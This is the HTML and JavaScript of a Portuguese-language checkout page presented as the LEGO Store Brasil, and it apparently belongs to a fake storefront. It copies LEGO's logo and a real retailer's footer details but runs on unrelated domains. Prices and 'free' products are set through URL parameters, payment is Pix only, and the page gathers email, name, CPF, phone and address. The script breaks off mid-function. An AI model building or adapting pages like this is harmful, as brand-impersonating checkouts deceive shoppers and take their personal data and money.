<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalizar Compra - LEGO Store Brasil</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Adicionando scripts UTMify no head conforme layout React -->
    <script>
        window.pixelId = "689d6967a9b91cc128240c1f";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        async
        defer
    ></script>
    
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
        }
        .animate-fade-in {
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #dc2626;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 2000;
            opacity: 0;
            transition: all 0.3s ease;
            min-width: 280px;
            max-width: 85%;
            text-align: center;
            font-weight: 400;
            font-size: 14px;
            line-height: 1.4;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.error { background: #ef4444; }
        .toast.success { background: #22c55e; }
        .toast.info { background: #3b82f6; }
        /* Adicionando estilos para steps e animações */
        .step-indicator {
            transition: all 0.3s ease;
        }
        .step-complete {
            background-color: #22c55e;
        }
        .step-active {
            background-color: #3b82f6;
        }
        .step-inactive {
            background-color: #d1d5db;
        }
        .animate-slide-in {
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from { transform: translateX(20px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
    
    <script>
        const CONFIG = {
            API_BASE_URL: "https://monkeycheckout.online/vakinha-luky",
            FRONTEND_URL: "https://legostore.online"
        };
    </script>
</head>
<body class="bg-gray-50">
    <!-- Header idêntico ao CheckoutHeader React com banner azul e logo LEGO -->
    <div class="bg-blue-600 text-white text-center py-2 text-xs md:text-sm">
        <div class="flex items-center justify-center gap-2 px-2">
            <span class="text-center">A semana favorita de todo bruxo está quase chegando</span>
            <button class="underline hidden md:inline">Saiba mais</button>
        </div>
    </div>

    <header class="bg-yellow-400 border-b border-yellow-500">
        <div class="max-w-7xl mx-auto px-2 md:px-4">
            <div class="flex items-center justify-between h-14 md:h-16">
                <div class="flex items-center flex-row">
                    <img
                        src="https://legobrasil.vtexassets.com/assets/vtex/assets-builder/legobrasil.dup-template/1.28.0/logo___40c43ea8a6afef0f36be240072a0e00d.png"
                        alt="LEGO"
                        class="h-8 md:h-10 w-auto"
                    />
                </div>

                <div class="flex items-center gap-2 text-black">
                    <svg class="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                    <span class="font-semibold text-sm md:text-base">Checkout seguro</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="min-h-screen bg-gray-50 animate-fade-in">
        <div class="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
            
            <!-- Implementando sistema de steps completo -->
            <!-- Step 1: Email -->
            <div id="step-email" class="step-content">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
                </div>
                
                <div class="p-6 text-center">
                    <h2 class="text-lg font-medium text-gray-700 mb-2">Para finalizar a compra, informe seu e-mail.</h2>
                    <p class="text-sm text-gray-500 mb-8">Rápido. Fácil. Seguro.</p>

                    <div class="mb-4">
                        <input 
                            type="email" 
                            id="email-step"
                            placeholder="seu@email.com" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center"
                        >
                        <div id="emailStepError" class="hidden text-xs text-red-500 mt-2"></div>
                    </div>

                    <button id="continueEmailBtn" class="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-full font-semibold mb-4">
                        Continuar
                    </button>

                    <div class="text-left mt-8">
                        <p class="text-sm text-orange-600 font-medium mb-3">Usamos seu e-mail de forma 100% segura para:</p>
                        <ul class="text-sm text-gray-600 space-y-2">
                            <li class="flex items-center gap-2">
                                <span class="text-green-500">✓</span>
                                Identificar seu perfil
                            </li>
                            <li class="flex items-center gap-2">
                                <span class="text-green-500">✓</span>
                                Notificar sobre o andamento do seu pedido
                            </li>
                            <li class="flex items-center gap-2">
                                <span class="text-green-500">✓</span>
                                Gerenciar seu histórico de compras
                            </li>
                            <li class="flex items-center gap-2">
                                <span class="text-green-500">✓</span>
                                Acelerar o preenchimento de suas informações
                            </li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Step 2: Personal Data -->
            <div id="step-personal" class="step-content hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
                </div>

                <div class="p-4">
                    <div class="flex items-center gap-3 mb-6">
                        <div class="w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-semibold">
                            1
                        </div>
                        <h2 class="text-lg font-medium text-gray-900">Dados pessoais</h2>
                    </div>

                    <p class="text-sm text-gray-600 mb-6">
                        Solicitamos apenas as informações essenciais para a realização da compra.
                    </p>

                    <div class="space-y-4">
                        <div>
                            <input 
                                type="email" 
                                id="email-display"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-100"
                                disabled
                            >
                        </div>

                        <div>
                            <input 
                                type="text" 
                                id="firstName"
                                placeholder="Primeiro nome" 
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            >
                            <div id="firstNameError" class="hidden text-xs text-red-500 mt-1">Campo obrigatório.</div>
                        </div>

                        <div>
                            <input 
                                type="text" 
                                id="lastName"
                                placeholder="Último nome" 
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            >
                            <div id="lastNameError" class="hidden text-xs text-red-500 mt-1">Campo obrigatório.</div>
                        </div>

                        <input 
                            type="text" 
                            id="cpf"
                            placeholder="000.000.000-00" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        >

                        <input 
                            type="tel" 
                            id="phone"
                            placeholder="(11) 99999-9999" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        >

                        <div class="space-y-3 pt-4">
                            <label class="flex items-center gap-2">
                                <input type="checkbox" id="saveInfo" class="w-4 h-4 text-blue-600">
                                <span class="text-sm text-gray-700">Salvar minhas informações para próximas compras.</span>
                            </label>

                            <label class="flex items-center gap-2">
                                <input type="checkbox" id="receivePromotions" class="w-4 h-4 text-blue-600">
                                <span class="text-sm text-gray-700">Quero receber e-mails com promoções.</span>
                            </label>
                        </div>
                    </div>

                    <button id="continuePersonalBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-full font-semibold mt-8">
                        Ir para a Entrega
                    </button>
                </div>
            </div>

            <!-- Step 3: Address -->
            <div id="step-address" class="step-content hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
                </div>

                <div class="p-4">
                    <!-- Step 1 Complete -->
                    <div class="flex items-center gap-3 mb-4">
                        <div class="w-8 h-8 bg-green-600 text-white rounded-full flex items-center justify-center text-sm">
                            ✓
                        </div>
                        <div>
                            <h2 class="text-sm font-medium text-gray-900">Dados pessoais</h2>
                            <p class="text-xs text-gray-500" id="personal-summary"></p>
                        </div>
                    </div>

                    <!-- Step 2 Active -->
                    <div class="flex items-center gap-3 mb-6">
                        <div class="w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm font-semibold">
                            2
                        </div>
                        <h2 class="text-lg font-medium text-gray-900">Entrega</h2>
                    </div>

                    <!-- Delivery Options -->
                    <div class="flex bg-gray-100 rounded-full p-1 mb-4">
                        <button id="receberBtn" class="flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors bg-blue-600 text-white">
                            Receber
                        </button>
                        <button id="retirarBtn" class="flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors text-gray-600">
                            Retirar
                        </button>
                    </div>

                    <!-- CEP -->
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-2">CEP</label>
                        <div class="flex gap-2 mb-2">
                            <input 
                                type="text" 
                                id="cep"
                                placeholder="00000-000" 
                                maxlength="9"
                                class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            >
                            <button id="calculateBtn" class="px-4 py-2 text-blue-600 border border-blue-600 rounded-md hover:bg-blue-50 bg-transparent">
                                Calcular
                            </button>
                        </div>
                        <div id="cepError" class="hidden text-xs text-red-500 mb-2"></div>
                    </div>

                    <!-- Shipping Options (will be populated dynamically) -->
                    <div id="shippingOptions" class="hidden mb-6">
                        <h3 class="text-sm font-medium text-gray-700 mb-3">Forma de entrega</h3>
                        <div id="shippingList" class="space-y-2"></div>
                    </div>

                    <!-- Address Details -->
                    <div id="addressDetails" class="hidden mb-6">
                        <h3 class="text-sm font-medium text-gray-700 mb-3">Endereço de entrega</h3>
                        <div class="space-y-4">
                            <input 
                                type="text" 
                                id="addressNumber"
                                placeholder="Número" 
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            >
                            <input 
                                type="text" 
                                id="complement"
                                placeholder="Complemento e referência" 
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            >
                        </div>
                    </div>

                    <button id="continueAddressBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-full font-semibold" disabled>
                        Ir para o pagamento
                    </button>

                    <!-- Step 3 Preview -->
                    <div class="flex items-center gap-3 mt-8 pt-6 border-t">
                        <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-sm font-semibold">
                            3
                        </div>
                        <div>
                            <h2 class="text-sm font-medium text-gray-900">Pagamento</h2>
                            <p class="text-xs text-gray-500">Aguardando o preenchimento dos dados.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Step 4: Payment -->
            <div id="step-payment" class="step-content hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900">Finalizar compra</h1>
                </div>

                <div class="p-4">
                    <!-- Previous Steps Summary -->
                    <div class="space-y-6 mb-8">
                        <!-- Step 1 Summary -->
                        <div class="border-b pb-4">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center gap-3">
                                    <div class="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-semibold">
                                        1
                                    </div>
                                    <h3 class="font-medium text-gray-900">Dados pessoais</h3>
                                </div>
                                <button onclick="goToStep('personal')" class="text-blue-600 hover:text-blue-700">
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
                                    </svg>
                                </button>
                            </div>
                            <div class="ml-9 text-sm text-gray-600" id="personal-summary-payment"></div>
                        </div>

                        <!-- Step 2 Summary -->
                        <div class="border-b pb-4">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center gap-3">
                                    <div class="w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-semibold">
                                        2
                                    </div>
                                    <h3 class="font-medium text-gray-900">Entrega</h3>
                                </div>
                                <button onclick="goToStep('address')" class="text-blue-600 hover:text-blue-700">
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
                                    </svg>
                                </button>
                            </div>
                            <div class="ml-9 text-sm text-gray-600" id="delivery-summary"></div>
                        </div>
                    </div>

                    <!-- Payment Method -->
                    <div class="mb-6">
                        <h3 class="text-sm font-medium text-gray-700 mb-3">Forma de pagamento</h3>
                        <button id="pixPaymentBtn" class="w-full border-2 border-blue-600 bg-white rounded-lg p-4 transition-colors">
                            <div class="flex items-center justify-between">
                                <span class="font-medium text-blue-600">Pix</span>
                                <div class="w-10 h-6 flex items-center justify-center">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png" alt="pix logo" class="h-full object-contain">
                                </div>
                            </div>
                        </button>
                    </div>

                    <!-- Order Summary -->
                    <div class="mb-6">
                        <h3 class="text-lg font-medium text-gray-900 mb-4">Resumo do pedido</h3>
                        <div id="orderSummary">
                            <!-- Will be populated from localStorage -->
                        </div>
                    </div>

                    <button id="finalizeBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-full font-semibold transition-colors flex items-center justify-center gap-2">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                        </svg>
                        Finalizar compra
                    </button>
                </div>
            </div>
        </div>

        <!-- Mantendo footer idêntico -->
        <div class="bg-gray-100 p-4 text-center text-sm text-gray-600">
            <p class="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
            <p class="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
            <p class="mb-4">
                M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
                CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
            </p>
            <div class="flex justify-center gap-2">
                <img
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png?height=24&width=40&text=PIX"
                    alt="PIX"
                    class="h-6"
                />
            </div>
        </div>
    </div>

    <script>
        const API_BASE_URL = CONFIG.API_BASE_URL;
        let currentStep = 'email';
        let formData = {};
        let selectedShipping = null;
        let deliveryMethod = 'RECEBER';
        let productData = null;

        function getProductData() {
            // Primeiro tenta pegar da URL
            const urlParams = new URLSearchParams(window.location.search);
            const productId = urlParams.get('id');
            const productName = urlParams.get('name');
            const productPrice = urlParams.get('price');
            const productImage = urlParams.get('image');
            const isFree = urlParams.get('isFree') === 'true';
            
            if (productId && productName && productPrice) {
                return {
                    id: productId,
                    name: decodeURIComponent(productName),
                    finalPrice: parseFloat(productPrice),
                    originalPrice: parseFloat(urlParams.get('originalPrice') || productPrice),
                    isFree: isFree,
                    image: productImage ? decodeURIComponent(productImage) : '/placeholder.svg'
                };
            }
            
            // Fallback para localStorage
            const checkoutData = localStorage.getItem('checkoutProduct');
            if (checkoutData) {
                return JSON.parse(checkoutData);
            }
            
            // Se não encontrar produto, redireciona para home
            alert('Nenhum produto selecionado. Redirecionando para a página inicial.');
            window.location.href = '/';
            return null;
        }

        async function getAddressFromCep(cep) {
            try {
                const cepNumbers = cep.replace(/\D/g, '');
                const response = await fetch(`https://viacep.com.br/ws/${cepNumbers}/json/`);
                const data = await response.json();

                if (data.erro) {
                    throw new Error('CEP não encontrado');
                }

                return {
                    street: data.logradouro,
                    district: data.bairro,
                    city: data.localidade,
                    state: data.uf,
                    fullAddress: `${data.logradouro}, ${data.bairro} - ${data.localidade} - ${data.uf}`
                };
            } catch (error) {
                console.error('Erro ao buscar CEP:', error);
                return null;
            }
        }

        function hasOnlyFreeItems() {
            return productData && productData.isFree;
        }

        function showTemporaryNotification() {
            showToast('Produtos gratuitos não podem ser retirados na loja. Selecione a opção "Receber".', 'error');
        }

        function updatePaymentSummary() {
            if (!productData) return;
            
            const shippingCost = deliveryMethod === 'RETIRAR' ? 0 : (selectedShipping?.price || 0);
            const total = productData.finalPrice + shippingCost;
            
            document.getElementById('orderSummary').innerHTML = `
                <div class="border rounded-lg p-4 mb-4">
                    <div class="flex items-center gap-3 mb-3">
                        <div class="w-12 h-12 bg-gray-100 rounded-lg flex items-center justify-center">
                            <img src="${productData.image}" alt="${productData.name}" class="w-10 h-10 object-cover rounded">
                        </div>
                        <div class="flex-1">
                            <h4 class="font-medium text-gray-900">${productData.name}</h4>
                            <p class="text-sm text-gray-600">Quantidade: 1</p>
                        </div>
                        <div class="text-right">
                            <p class="font-semibold">R$ ${productData.finalPrice.toFixed(2).replace('.', ',')}</p>
                        </div>
                    </div>
                </div>
                
                <div class="space-y-2 text-sm">
                    <div class="flex justify-between">
                        <span>Subtotal:</span>
                        <span>R$ ${productData.finalPrice.toFixed(2).replace('.', ',')}</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Entrega:</span>
                        <span>${shippingCost === 0 ? 'Grátis' : 'R$ ' + shippingCost.toFixed(2).replace('.', ',')}</span>
                    </div>
                    <div class="border-t pt-2 flex justify-between font-semibold">
                        <span>Total:</span>
                        <span>R$ ${total.toFixed(2).replace('.', ',')}</span>
                    </div>
                </div>
            `;
        }

        function saveFormData() {
            const currentFormData = {
                email: document.getElementById('email-step')?.value || formData.email,
                firstName: document.getElementById('firstName')?.value || formData.firstName,
                lastName: document.getElementById('lastName')?.value || formData.lastName,
                cpf: document.getElementById('cpf')?.value || formData.cpf,
                phone: document.getElementById('phone')?.value || formData.phone,
                cep: document.getElementById('cep')?.value || formData.cep,
                addressNumber: document.getElementById('addressNumber')?.value || formData.addressNumber,
                complement: document.getElementById('complement')?.value || formData.complement,
                pickupDate: formData.pickupDate,
                deliveryMethod: deliveryMethod,
                selectedShipping: selectedShipping
            };
            
            localStorage.setItem('checkoutFormData', JSON.stringify(currentFormData));
        }

        function loadFormData() {
            const savedData = localStorage.getItem('checkoutFormData');
            if (savedData) {
                const data = JSON.parse(savedData);
                formData = { ...formData, ...data };
                deliveryMethod = data.deliveryMethod || 'RECEBER';
                selectedShipping = data.selectedShipping;
                
                // Preencher campos do formulário
                if (data.email) document.getElementById('email-step').value = data.email;
                if (data.firstName) document.getElementById('firstName').value = data.firstName;
                if (data.lastName) document.getElementById('lastName').value = data.lastName;
                if (data.cpf) document.getElementById('cpf').value = data.cpf;
                if (data.phone) document.getElementById('phone').value = data.phone;
                if (data.cep) document.getElementById('cep').value = data.cep;
                if (data.addressNumber) document.getElementById('addressNumber').value = data.addressNumber;
                if (data.complement) document.getElementById('complement').value = data.complement;
            }
        }

        // Step navigation
        function goToStep(step) {
            saveFormData();
            
            document.querySelectorAll('.step-content').forEach(el => el.classList.add('hidden'));
            document.getElementById(`step-${step}`).classList.remove('hidden');
            document.getElementById(`step-${step}`).classList.add('animate-slide-in');
            currentStep = step;
            
            if (step === 'payment') {
                updatePaymentSummary();
            }
        }

        // UTM capture functions
        function getUtmParams() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                utm_source: urlParams.get('utm_source') || 'direct',
                utm_medium: urlParams.get('utm_medium') || 'none',
                utm_campaign: urlParams.get('utm_campaign'),
                utm_content: urlParams.get('utm_content'),
                utm_term: urlParams.get('utm_term'),
                xcod: urlParams.get('xcod'),
                sck: urlParams.get('sck'),
                utm_id: urlParams.get('utm_id')
            };
        }

        function maskCPF(value) {
            return value
                .replace(/\D/g, '')
                .slice(0, 11)
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2');
        }

        function maskPhone(value) {
            return value
                .replace(/\D/g, '')
                .slice(0, 11)
                .replace(/(\d{2})(\d)/, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2');
        }

        function maskCEP(value) {
            return value
                .replace(/\D/g, '')
                .slice(0, 8)
                .replace(/(\d{5})(\d)/, '$1-$2');
        }

        // Toast notifications
        function showToast(message, type = 'success') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }

            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 4000);
        }

        // Email validation
        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function showCalendar() {
            // Remove calendário existente se houver
            const existingCalendar = document.getElementById('pickupCalendar');
            if (existingCalendar) existingCalendar.remove();

            const calendarDiv = document.createElement('div');
            calendarDiv.id = 'pickupCalendar';
            calendarDiv.className = 'mt-4 animate-fade-in';
            
            calendarDiv.innerHTML = `
                <div class="border rounded-lg p-4 bg-white">
                    <div class="flex items-center gap-2 mb-4">
                        <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                        </svg>
                        <h3 class="font-medium text-gray-900">Escolha a data de retirada</h3>
                    </div>

                    <!-- Navegação do mês -->
                    <div class="flex items-center justify-between mb-4">
                        <button onclick="navigateMonth('prev')" class="p-1 hover:bg-gray-100 rounded">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                            </svg>
                        </button>
                        <h4 id="monthYear" class="font-medium text-gray-900 capitalize"></h4>
                        <button onclick="navigateMonth('next')" class="p-1 hover:bg-gray-100 rounded">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                            </svg>
                        </button>
                    </div>

                    <!-- Dias da semana -->
                    <div class="grid grid-cols-7 gap-1 mb-2">
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Dom</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Seg</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Ter</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Qua</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Qui</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Sex</div>
                        <div class="text-center text-sm font-medium text-gray-500 py-2">Sáb</div>
                    </div>

                    <!-- Calendário -->
                    <div id="calendarGrid" class="grid grid-cols-7 gap-1 mb-4">
                        <!-- Dias serão gerados dinamicamente -->
                    </div>

                    <!-- Informações importantes -->
                    <div class="bg-blue-50 p-3 rounded-lg">
                        <h4 class="text-sm font-medium text-blue-800 mb-2">Informações importantes:</h4>
                        <ul class="text-xs text-blue-700 space-y-1">
                            <li>• Dias úteis e sábados disponíveis</li>
                            <li>• Seg-Sex: 09:00 às 18:00 | Sáb: 09:00 às 14:00</li>
                            <li>• Retirada a partir do próximo dia útil</li>
                            <li>• Produto reservado por até 7 dias</li>
                        </ul>
                    </div>
                </div>
            `;
            
            document.getElementById('shippingList').appendChild(calendarDiv);
            
            // Inicializar calendário
            initializeCalendar();
        }

        let currentMonth = new Date();
        let selectedDate = '';

        function generateCalendar() {
            const year = currentMonth.getFullYear();
            const month = currentMonth.getMonth();

            const firstDay = new Date(year, month, 1);
            const lastDay = new Date(year, month + 1, 0);
            const startDate = new Date(firstDay);
            startDate.setDate(startDate.getDate() - firstDay.getDay());

            const days = [];
            const today = new Date();

            for (let i = 0; i < 42; i++) {
                const date = new Date(startDate);
                date.setDate(startDate.getDate() + i);

                const isCurrentMonth = date.getMonth() === month;
                const isPast = date < today;
                const isToday = date.toDateString() === today.toDateString();
                const isSunday = date.getDay() === 0;
                const isAvailable = isCurrentMonth && !isPast && !isSunday && !isToday;

                days.push({
                    date: date,
                    day: date.getDate(),
                    isCurrentMonth,
                    isAvailable,
                    dateString: date.toISOString().split("T")[0],
                });
            }

            return days;
        }

        function navigateMonth(direction) {
            if (direction === 'prev') {
                currentMonth.setMonth(currentMonth.getMonth() - 1);
            } else {
                currentMonth.setMonth(currentMonth.getMonth() + 1);
            }
            updateCalendarDisplay();
        }

        function formatMonthYear(date) {
            return date.toLocaleDateString("pt-BR", { month: "long", year: "numeric" });
        }

        function initializeCalendar() {
            currentMonth = new Date();
            updateCalendarDisplay();
        }

        function updateCalendarDisplay() {
            const monthYearElement = document.getElementById('monthYear');
            const calendarGrid = document.getElementById('calendarGrid');
            
            if (!monthYearElement || !calendarGrid) return;

            monthYearElement.textContent = formatMonthYear(currentMonth);
            
            const days = generateCalendar();
            calendarGrid.innerHTML = '';

            days.forEach(day => {
                const button = document.createElement('button');
                button.textContent = day.day;
                button.className = `
                    h-10 text-sm rounded transition-colors
                    ${!day.isCurrentMonth ? 'text-gray-300' : ''}
                    ${day.isAvailable ? 'hover:bg-blue-50 cursor-pointer' : 'cursor-not-allowed'}
                    ${selectedDate === day.dateString ? 'bg-blue-600 text-white' : ''}
                    ${!day.isAvailable && day.isCurrentMonth ? 'text-gray-400' : ''}
                `;
                
                if (day.isAvailable) {
                    button.onclick = () => selectDate(day.dateString);
                } else {
                    button.disabled = true;
                }
                
                calendarGrid.appendChild(button);
            });
        }

        function selectDate(dateString) {
            selectedDate = dateString;
            formData.pickupDate = dateString;
            updateCalendarDisplay();
            

        }

        // Toast notifications
        function showToast(message, type = 'success') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }

            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 4000);
        }

        // Email validation
        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        // Step 1: Email
        document.getElementById('continueEmailBtn').addEventListener('click', function() {
            const email = document.getElementById('email-step').value.trim();
            const errorEl = document.getElementById('emailStepError');
            
            if (!email) {
                errorEl.textContent = 'E-mail é obrigatório';
                errorEl.classList.remove('hidden');
                return;
            }
            
            if (!validateEmail(email)) {
                errorEl.textContent = 'E-mail deve ter um formato válido';
                errorEl.classList.remove('hidden');
                return;
            }
            
            formData.email = email;
            document.getElementById('email-display').value = email;
            goToStep('personal');
        });

        // Step 2: Personal Data
        document.getElementById('continuePersonalBtn').addEventListener('click', function() {
            const firstName = document.getElementById('firstName').value.trim();
            const lastName = document.getElementById('lastName').value.trim();
            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
            const phone = document.getElementById('phone').value.replace(/\D/g, '');
            
            if (!firstName || !lastName || !cpf || !phone) {
                showToast('Por favor, preencha todos os campos obrigatórios.', 'error');
                return;
            }
            
            if (cpf.length !== 11) {
                showToast('CPF deve ter 11 dígitos.', 'error');
                return;
            }
            
            if (phone.length < 10) {
                showToast('Telefone deve ter pelo menos 10 dígitos.', 'error');
                return;
            }
            
            formData.firstName = firstName;
            formData.lastName = lastName;
            formData.cpf = cpf;
            formData.phone = phone;
            
            // Update summary
            document.getElementById('personal-summary').innerHTML = `
                <p>${formData.email}</p>
                <p>${firstName} ${lastName}</p>
            `;
            
            goToStep('address');
        });

        document.getElementById('continueAddressBtn').addEventListener('click', function() {
            if (!selectedShipping) {
                showToast('Por favor, selecione uma opção de entrega.', 'error');
                return;
            }
            
            if (deliveryMethod === 'RECEBER') {
                const addressNumber = document.getElementById('addressNumber').value.trim();
                if (!addressNumber) {
                    showToast('Por favor, informe o número do endereço.', 'error');
                    return;
                }
                formData.addressNumber = addressNumber;
                formData.complement = document.getElementById('complement').value.trim();
            } else if (deliveryMethod === 'RETIRAR' && !formData.pickupDate) {
                showToast('Por favor, selecione uma data para retirada.', 'error');
                return;
            }
            
            goToStep('payment');
        });

        document.getElementById('finalizeBtn').addEventListener('click', function() {
            if (!formData.email || !formData.firstName || !formData.lastName || !formData.cpf || !formData.phone) {
                showToast('Por favor, preencha todos os dados pessoais.', 'error');
                return;
            }
            
